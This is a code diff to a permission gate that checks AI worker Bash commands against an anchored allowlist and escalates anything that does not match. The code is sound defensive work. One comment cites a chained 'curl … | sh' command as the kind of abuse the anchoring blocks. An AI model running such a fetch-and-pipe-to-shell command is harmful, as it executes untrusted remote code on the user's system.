@@ -31,7 +31,7 @@ export class OrchestrationPermissionGate {
    *   log?: object,
    * }} opts
    */
-  constructor({ sessionManager, isOwnedSession, policyForSession, emitEscalation = null, log = null }) {
+  constructor({ sessionManager, isOwnedSession, policyForSession, emitEscalation = null, bashAllowlist = [], log = null }) {
     if (!sessionManager || typeof sessionManager.on !== 'function') {
       throw new Error('OrchestrationPermissionGate requires a sessionManager EventEmitter')
     }
@@ -42,6 +42,13 @@ export class OrchestrationPermissionGate {
     this._policyForSession = policyForSession
     this._emitEscalation = emitEscalation
     this._log = log
+    // Compile the implement-worker Bash allowlist once. String entries are
+    // ANCHORED (^(?:…)$) so an allowlisted phrase can't match as a substring of
+    // a larger command — `npm test` must NOT allow `npm test && curl x | sh`.
+    // Pre-built RegExp entries pass through as-authored. A match is auto-approved;
+    // a non-match escalates. There is NEVER a standing whitelist — each request
+    // is still answered per-request via respondToPermission.
+    this._bashAllowlist = (bashAllowlist || []).map((p) => (p instanceof RegExp ? p : new RegExp(`^(?:${p})$`)))
     this._onEvent = this._handleSessionEvent.bind(this)
     this._sm.on('session_event', this._onEvent)
   }
@@ -70,14 +77,19 @@ export class OrchestrationPermissionGate {
     this._respond(sessionId, requestId, decision)
   }
 
-  _decide(role, toolName, _input) {
+  _decide(role, toolName, input) {
     if (ALWAYS_DENY.has(toolName)) return 'deny'
     // Audit workers are read-only: file reads are already allowed via session
     // rules, so anything reaching the gate (Bash, shell) is denied.
     if (role === 'audit') return 'deny'
-    // Implement workers: Bash isn't rule-eligible → escalate to the user.
-    // (The allowlist match is a later step; default-escalate is fail-closed.)
-    if (toolName === 'Bash' || toolName === 'shell') return 'escalate'
+    // Implement workers: Bash (never rule-eligible — NEVER_AUTO_ALLOW) is matched
+    // against the compiled allowlist. Match → allow; anything else → escalate.
+    // Fail-closed: an empty allowlist escalates every Bash command.
+    if (toolName === 'Bash' || toolName === 'shell') {
+      const command = typeof input?.command === 'string' ? input.command : ''
+      if (command && this._bashAllowlist.some((re) => re.test(command))) return 'allow'
+      return 'escalate'
+    }
     return 'deny'
   }
 
